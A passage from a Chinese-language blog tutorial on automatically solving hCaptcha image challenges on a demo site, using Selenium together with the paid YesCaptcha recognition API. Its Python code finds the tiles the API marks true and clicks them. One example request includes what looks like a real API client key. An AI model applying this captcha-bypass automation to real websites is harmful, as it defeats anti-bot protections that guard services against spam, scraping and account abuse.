的验证码识别，利用 YesCaptcha 我们也能轻松知道哪些图片和输入内容是匹配的。</p><p>下面让们来试试看。</p><h2 id="YesCaptcha"><a href="#YesCaptcha" class="headerlink" title="YesCaptcha"></a>YesCaptcha</h2><p>在使用之前我们需要先注册下这个网站，网站地址是 <span class="exturl" data-url="aHR0cHM6Ly95ZXNjYXB0Y2hhLmNvbS9pL0NuWlBCdQ==">https://yescaptcha.com/i/CnZPBu<i class="fa fa-external-link-alt"></i></span> ，注册个账号之后大家可以在后台获取一个账户密钥，也就是 ClientKey，保存备用。</p><p><img src="https://qiniu.cuiqingcai.com/vs5pl.png" alt=""></p><p>OK，然后我们可以查看下这里的官方文档：<span class="exturl" data-url="aHR0cHM6Ly95ZXNjYXB0Y2hhLmF0bGFzc2lhbi5uZXQvd2lraS9zcGFjZXMvWUVTQ0FQVENIQS9wYWdlcy8yNDU0MzIzMy9IQ2FwdGNoYUNsYXNzaWZpY2F0aW9uK0hjYXB0Y2hh">https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/24543233/HCaptchaClassification+Hcaptcha<i class="fa fa-external-link-alt"></i></span>，这里介绍介绍了一个 API，大致内容是这样的。</p><p>首先有一个创建任务的 API，API 地址为 <span class="exturl" data-url="aHR0cHM6Ly9hcGkueWVzY2FwdGNoYS5jb20vY3JlYXRlVGFzaw==">https://api.yescaptcha.com/createTask<i class="fa fa-external-link-alt"></i></span>，然后看下请求参数：</p><p><img src="https://qiniu.cuiqingcai.com/xpyre.png" alt=""></p><p>这里我们需要传入这么几个参数：</p><ul>  <li>    <p>type：内容就是 ****</p>  </li>  <li>    <p>queries：是验证码对应的 Base64 编码，这里直接转成一个列表就可以</p>  </li>  <li>    <p>question：对应的问题 ID，也就是识别目标的代号，这里其实就是问题整句的内容</p>  </li>  <li>    <p>corrdinate：一个返回结果的控制开关，默认会返回每张图片识别的 true / false 结果，也就是第 x 张图片是否和图片匹配，如果加上该参数，那么 API 就会返回对应匹配图片的索引。</p>  </li></ul><p>比如这里我们可以 POST 这样的一个内容给服务器，结构如下：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"clientKey"</span>: <span class="string">"cc9c18d3e263515c2c072b36a7125eecc078618f"</span>,</span><br><span class="line">    <span class="attr">"task"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"HCaptchaClassification"</span>,</span><br><span class="line">        <span class="attr">"queries"</span>: [</span><br><span class="line">            <span class="string">"/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8Uw..."</span>,</span><br><span class="line">            <span class="string">"/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8Uw..."</span>,</span><br><span class="line">            ...</span><br><span class="line">            <span class="string">"/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8Uw..."</span>,</span><br><span class="line">    ],</span><br><span class="line">        <span class="attr">"question"</span>: <span class="string">"请单击每个包含卡车的图像。"</span> <span class="comment">// 直接上传问题整句</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>然后服务器就会返回类似这样的响应：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errorId"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"errorCode"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"status"</span>: <span class="string">"ready"</span>,</span><br><span class="line">    <span class="attr">"solution"</span>: &#123;</span><br><span class="line">        <span class="attr">"objects"</span>: [<span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">true</span>] <span class="comment">// 返回图片是否为目标,</span></span><br><span class="line">        <span class="string">"labels"</span>: [<span class="string">"truck"</span>, <span class="string">"boat"</span>, <span class="string">"boat"</span>, <span class="string">"truck"</span>, <span class="string">"truck"</span>, <span class="string">"airplane-right"</span>, <span class="string">"truck"</span>, <span class="string">"truck"</span>] <span class="comment">// 返回图片对应的标签</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"taskId"</span>: <span class="string">"5aa8be0c-94a5-11ec-80d7-00163f00a53c"</span><span class="string">"</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre>      </td>    </tr>  </table></figure><p>OK，我们可以看到，返回结果的 solution 字段中的 objects 字段就包含了一串 true 和 false 的列表，这就代表了每张图片是否和目标匹配。</p><p>知道了这个结果之后，我们只需要将返回结果为 true 的图片进行模拟点击就好了。</p><h2 id="代码基础实现"><a href="#代码基础实现" class="headerlink" title="代码基础实现"></a>代码基础实现</h2><p>行，那有了基本思路之后，那我们就开始用 Python 实现下整个流程吧，这里我们就拿 <span class="exturl" data-url="aHR0cHM6Ly9kZW1vY2FwdGNoYS5jb20vZGVtby1mb3JtLWVuZy9oY2FwdGNoYS5odG1s">https://democaptcha.com/demo-form-eng/hcaptcha.html<i class="fa fa-external-link-alt"></i></span> 这个网站作为样例来讲解下整个识别和模拟点击过程。</p><h3 id="识别封装"><a href="#识别封装" class="headerlink" title="识别封装"></a>识别封装</h3><p>首先我们对上面的任务 API 实现一下封装，来先写一个类：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> app.settings <span class="keyword">import</span> CAPTCHA_RESOLVER_API_KEY, CAPTCHA_RESOLVER_API_URL</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaptchaResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, api_url=CAPTCHA_RESOLVER_API_URL, api_key=CAPTCHA_RESOLVER_API_KEY)</span>:</span></span><br><span class="line">        self.api_url = api_url</span><br><span class="line">        self.api_key = api_key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_task</span><span class="params">(self, queries, question)</span>:</span></span><br><span class="line">        logger.debug(<span class="string">f'start to recognize image for question <span class="subst">&#123;question&#125;</span>'</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"clientKey"</span>: self.api_key,</span><br><span class="line">            <span class="string">"task"</span>: &#123;</span><br><span class="line">                <span class="string">"type"</span>: <span class="string">"HCaptchaClassification"</span>,</span><br><span class="line">                <span class="string">"queries"</span>: queries,</span><br><span class="line">                <span class="string">"question"</span>: question</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(self.api_url, json=data)</span><br><span class="line">            result = response.json()</span><br><span class="line">            logger.debug(<span class="string">f'captcha recogize result <span class="subst">&#123;result&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException:</span><br><span class="line">            logger.exception(</span><br><span class="line">                <span class="string">'error occurred while recognizing captcha'</span>, exc_info=<span class="literal">True</span>)</span><br></pre>      </td>    </tr>  </table></figure><p>OK，这里我们就先定义了一个类 CaptchaResolver，然后主要接收两个参数，一个就是 <code>api_url</code>，这个对应的就是 <span class="exturl" data-url="aHR0cHM6Ly9hcGkueWVzY2FwdGNoYS5jb20vY3JlYXRlVGFzaw==">https://api.yescaptcha.com/createTask<i class="fa fa-external-link-alt"></i></span> 这个 API 地址，然后还有一个参数是 <code>api_key</code>，这个就是前文介绍的那个 ClientKey。</p><p>接着我们定义了一个 create_task 方法，接收两个参数，第一个参数 queries 就是每张验证码图片对应的 Base64 编码，第二个参数 <code>question</code> 就是要识别的问题整句，这里就是将整个请求用 requests 模拟实现了，最后返回对应的 JSON 内容的响应结果就好了。</p><h3 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h3><p>OK，那么接下来我们来用 Selenium 来模拟打开这个实例网站，然后模拟点选来触发验证码，接着识别验证码就好了。</p><p>首先写一个大致框架：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.remote.webelement <span class="keyword">import</span> WebElement</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> app.captcha_resolver <span class="keyword">import</span> CaptchaResolver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.browser = webdriver.Chrome()</span><br><span class="line">        self.browser.get(url)</span><br><span class="line">        self.wait = WebDriverWait(self.browser, <span class="number">10</span>)</span><br><span class="line">        self.captcha_resolver = CaptchaResolver()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        self.browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们先在构造方法里面初始化了一个 Chrome 浏览器操作对象，然后调用对应的 get 方法打开实例网站，接着声明了一个 WebDriverWait 对象和 CaptchaResolver 对象，以分别应对节点查找和验证码识别操作，留作备用。</p><h3 id="iframe-切换支持"><a href="#iframe-切换支持" class="headerlink" title="iframe 切换支持"></a>iframe 切换支持</h3><p>接着，下一步我们就该来模拟点击验证码的入口，来触发验证码了对吧。</p><p>通过观察我们发现这个验证码和 ReCaptcha 非常类似，其入口其实是在 iframe 里面加载的，对应的 iframe 是这样的：</p><p><img src="https://qiniu.cuiqingcai.com/0ynna.png" alt=""></p><p>另外弹出的验证码图片又在另外一个 iframe 里面，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/64976.png" alt=""></p><p>Selenium 查找节点是需要切换到对应的 iframe 里面才行的，不然是没法查到对应的节点，也就没法模拟点击什么的了。</p><p>所以这里我们定义几个工具方法，分别能够支持切换到入口对应的 iframe 和验证码本身对应的 iframe，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_entry_iframe</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    self.browser.switch_to.default_content()</span><br><span class="line">    captcha_entry_iframe = self.browser.find_element_by_css_selector(</span><br><span class="line">        <span class="string">'.h-captcha &gt; iframe'</span>)</span><br><span class="line">    <span class="keyword">return</span> captcha_entry_iframe</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_to_captcha_entry_iframe</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    captcha_entry_iframe: WebElement = self.get_captcha_entry_iframe()</span><br><span class="line">    self.browser.switch_to.frame(captcha_entry_iframe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_content_iframe</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    self.browser.switch_to.default_content()</span><br><span class="line">    captcha_content_iframe = self.browser.find_element_by_xpath(</span><br><span class="line">        <span class="string">'//iframe[contains(@title, "Main content")]'</span>)</span><br><span class="line">    <span class="keyword">return</span> captcha_content_iframe</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_to_captcha_content_iframe</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    captcha_content_iframe: WebElement = self.get_captcha_content_iframe()</span><br><span class="line">    self.browser.switch_to.frame(captcha_content_iframe)</span><br></pre>      </td>    </tr>  </table></figure><p>这样的话，我们只需要调用 switch_to_captcha_content_iframe 就能查找验证码图片里面的内容，调用 switch_to_captcha_entry_iframe 就能查找验证码入口里面的内容。</p><h3 id="触发验证码"><a href="#触发验证码" class="headerlink" title="触发验证码"></a>触发验证码</h3><p>OK，那么接下来的一步就是来模拟点击验证码的入口，然后把验证码触发出来了对吧，就是模拟点击这里：</p><p><img src="https://qiniu.cuiqingcai.com/31szt.png" alt=""></p><p>实现很简单，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_captcha</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    self.switch_to_captcha_entry_iframe()</span><br><span class="line">    captcha_entry = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'#anchor #checkbox'</span>)))</span><br><span class="line">    captcha_entry.click()</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    self.switch_to_captcha_content_iframe()</span><br><span class="line">    captcha_element: WebElement = self.get_captcha_element()</span><br><span class="line">    <span class="keyword">if</span> captcha_element.is_displayed:</span><br><span class="line">        logger.debug(<span class="string">'trigged captcha successfully'</span>)</span><br></pre>      </td>    </tr>  </table></figure><p>这里首先我们首先调用 switch_to_captcha_entry_iframe 进行了 iframe 的切换，然后找到那个入口框对应的节点，然后点击一下。</p><p>点击完了之后我们再调用 switch_to_captcha_content_iframe 切换到验证码本身对应的 iframe 里面，查找验证码本身对应的节点是否加载出来了，如果加载出来了，那么就证明触发成功了。</p><h3 id="找出识别目标"><a href="#找出识别目标" class="headerlink" title="找出识别目标"></a>找出识别目标</h3><p>OK，那么现在验证码可能就长这样子了：</p><p><img src="https://qiniu.cuiqingcai.com/n0dij.png" alt=""></p><p>那接下来我们要做的就是两件事了，一件事就是把匹配目标，也就是问题本身找出来，第二件事就是把每张验证码保存下来，然后转成 Base64 编码。</p><p>好，那么怎么查找问题呢呢？用 Selenium 常规的节点搜索就好了：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_target_text</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    captcha_target_name_element: WebElement = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'.prompt-text'</span>)))</span><br><span class="line">    <span class="keyword">return</span> captcha_target_name_element.text</span><br></pre>      </td>    </tr>  </table></figure><p>通过调用这个方法，我们就能得到上图中完整的问题文本了。</p><h2 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h2><p>接下来，我们就需要把每张图片进行下载并转成 Base64 编码了，我们观察下它的 HTML 结构：</p><p><img src="https://qiniu.cuiqingcai.com/f21kb.png" alt=""></p><p>我们可以看到，每个验证码其实都对应了一个 <code>.task-image</code> 的节点，然后里面有个 <code>.image-wrapper</code> 的节点，在里面有一个 <code>.image</code> 的节点，那图片怎么呈现的呢？这里它是设置了一个 style CSS 样式，通过 CSS 的 <code>backgroud</code> 来设置了验证码图片的地址。</p><p>所以，我们要想提取验证码图片也比较容易了，我们只需要找出 <code>.image</code> 节点的 style 属性的内容，然后提取其中的 url 就好了。</p><p>得到 URL 之后，转下 Base64 编码，利用 captcha_resolver 就可以对内容进行识别了。</p><p>所以代码可以写为如下内容：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_captcha</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># get target text</span></span><br><span class="line">    self.captcha_target_text = self.get_captcha_target_text()</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'captcha_target_text <span class="subst">&#123;self.captcha_target_text&#125;</span>'</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># extract all images</span></span><br><span class="line">    single_captcha_elements = self.wait.until(EC.visibility_of_all_elements_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'.task-image .image-wrapper .image'</span>)))</span><br><span class="line">    resized_single_captcha_base64_strings = []</span><br><span class="line">    <span class="keyword">for</span> i, single_captcha_element <span class="keyword">in</span> enumerate(single_captcha_elements):</span><br><span class="line">        single_captcha_element_style = single_captcha_element.get_attribute(</span><br><span class="line">            <span class="string">'style'</span>)</span><br><span class="line">        pattern = re.compile(<span class="string">'url\("(https.*?)"\)'</span>)</span><br><span class="line">        match_result = re.search(pattern, single_captcha_element_style)</span><br><span class="line">        single_captcha_element_url = match_result.group(</span><br><span class="line">            <span class="number">1</span>) <span class="keyword">if</span> match_result <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        logger.debug(</span><br><span class="line">            <span class="string">f'single_captcha_element_url <span class="subst">&#123;single_captcha_element_url&#125;</span>'</span>)</span><br><span class="line">        <span class="keyword">with</span> open(CAPTCHA_SINGLE_IMAGE_FILE_PATH % (i,), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(requests.get(single_captcha_element_url).content)</span><br><span class="line">        resized_single_captcha_base64_string = resize_base64_image(</span><br><span class="line">            CAPTCHA_SINGLE_IMAGE_FILE_PATH % (i,), (<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line">        resized_single_captcha_base64_strings.append(</span><br><span class="line">            resized_single_captcha_base64_string)</span><br><span class="line"></span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'length of single_captcha_element_urls <span class="subst">&#123;len(resized_single_captcha_base64_strings)&#125;</span>'</span>)</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们提取出来了每张验证码图片的 url，这里是用正则表达式进行批评的，提取出 url 之后，我们然后将其存入了 resized_single_captcha_base64_strings 列表里面。</p><p>其中这里的 Base64 编码我们单独定义了一个方法，传入了图片路径和调整大小，然后可以返回编码后的结果，定义如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> app.settings <span class="keyword">import</span> CAPTCHA_RESIZED_IMAGE_FILE_PATH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resize_base64_image</span><span class="params">(filename, size)</span>:</span></span><br><span class="line">    width, height = size</span><br><span class="line">    img = Image.open(filename)</span><br><span class="line">    new_img = img.resize((width, height))</span><br><span class="line">    new_img.save(CAPTCHA_RESIZED_IMAGE_FILE_PATH)</span><br><span class="line">    <span class="keyword">with</span> open(CAPTCHA_RESIZED_IMAGE_FILE_PATH, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        encoded_string = base64.b64encode(data)</span><br><span class="line">        <span class="keyword">return</span> encoded_string.decode(<span class="string">'utf-8'</span>)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="图片识别"><a href="#图片识别" class="headerlink" title="图片识别"></a>图片识别</h2><p>好，那么现在我们已经可以得到问题内容了，也能得到每张图片对应的 Base64 编码了，我们直接利用 YesCaptcha 进行图像识别就好了，代码调用如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment"># try to verify using API</span></span><br><span class="line">captcha_recognize_result = self.captcha_resolver.create_task(</span><br><span class="line">    resized_single_captcha_base64_strings,</span><br><span class="line">    self.captcha_target_text</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> captcha_recognize_result:</span><br><span class="line">    logger.error(<span class="string">'count not get captcha recognize result'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">recognized_results = captcha_recognize_result.get(</span><br><span class="line">    <span class="string">'solution'</span>, &#123;&#125;).get(<span class="string">'objects'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> recognized_results:</span><br><span class="line">    logger.error(<span class="string">'count not get captcha recognized indices'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br></pre>      </td>    </tr>  </table></figure><p>如果运行正常的话，我们可能得到如下的返回结果：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"errorId"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"errorCode"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"status"</span>: <span class="string">"ready"</span>,</span><br><span class="line">  <span class="attr">"solution"</span>: &#123;</span><br><span class="line">    <span class="attr">"objects"</span>: [<span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>],</span><br><span class="line">    <span class="attr">"labels"</span>: [</span><br><span class="line">      <span class="string">"boat"</span>,</span><br><span class="line">      <span class="string">"seaplane"</span>,</span><br><span class="line">      <span class="string">"bicycle"</span>,</span><br><span class="line">      <span class="string">"train"</span>,</span><br><span class="line">      <span class="string">"boat"</span>,</span><br><span class="line">      <span class="string">"train"</span>,</span><br><span class="line">      <span class="string">"boat"</span>,</span><br><span class="line">      <span class="string">"boat"</span>,</span><br><span class="line">      <span class="string">"bus"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"taskId"</span>: <span class="string">"25fee484-df63-11ec-b02e-c2654b11608a"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>现在我们可以看到 sulution 里面的 objects 字段就包含了 true false 的列表，比如第一个 true 就代表了第一个验证码是和问题匹配的，第二个 false 就代表了第二个验证码图片和问题是不匹配的。那序号和图片又是怎么对应的呢？见下图：</p><p><img src="https://qiniu.cuiqingcai.com/q1cn9.png" alt=""></p><p>从左到右一行行地数，序号依次递增，比如第一行第一个序号就是 0，那么其结果就是 objects 结果里面的第一个结果，true。</p><h2 id="模拟点击"><a href="#模拟点击" class="headerlink" title="模拟点击"></a>模拟点击</h2><p>现在我们已经得到 true false 列表了，我们只需要将结果是 true 的序号提取出来，然后对这些验证码小图点击就好了，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment"># click captchas</span></span><br><span class="line">recognized_indices = [i <span class="keyword">for</span> i, x <span class="keyword">in</span> enumerate(recognized_results) <span class="keyword">if</span> x]</span><br><span class="line">logger.debug(<span class="string">f'recognized_indices <span class="subst">&#123;recognized_indices&#125;</span>'</span>)</span><br><span class="line">click_targets = self.wait.until(EC.visibility_of_all_elements_located(</span><br><span class="line">    (By.CSS_SELECTOR, <span class="string">'.task-image'</span>)))</span><br><span class="line"><span class="keyword">for</span> recognized_index <span class="keyword">in</span> recognized_indices:</span><br><span class="line">    click_target: WebElement = click_targets[recognized_index]</span><br><span class="line">    click_target.click()</span><br><span class="line">    time.sleep(random())</span><br></pre>      </td>    </tr>  </table></figure><blockquote>  <p>当然我们也可以通过执行 JavaScript 来对每个节点进行模拟点击，效果是类似的。</p></blockquote><p>这里我们用 for 循环将 true false 列表转成了一个列表，列表的每个元素代表 true 在列表中的位置，其实就是我们的点击目标了。</p><p>然后接着我们获取了所有的验证码小图对应的节点，然后依次调用 click 方法进行点击即可。</p><p>这样我们就可以实现验证码小图的逐个识别了。</p><h3 id="点击验证"><a href="#点击验证" class="headerlink" title="点击验证"></a>点击验证</h3><p>好，那么有了上面的逻辑，我们就能完成整个 HCaptcha 的识别和点选了。</p><p>最后，我们模拟点击验证按钮就好了：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment"># after all captcha clicked</span></span><br><span class="line">verify_button: WebElement = self.get_verify_button()</span><br><span class="line"><span class="keyword">if</span> verify_button.is_displayed:</span><br><span class="line">    verify_button.click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre>      </td>    </tr>  </table></figure><p>而 verfiy_button 的提取也是用 Selenium 即可：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_verify_button</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    verify_button = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, <span class="string">'.button-submit'</span>)))</span><br><span class="line">    <span class="keyword">return</span> verify_button</span><br></pre>      </td>    </tr>  </table></figure><h3 id="校验结果"><a href="#校验结果" class="headerlink" 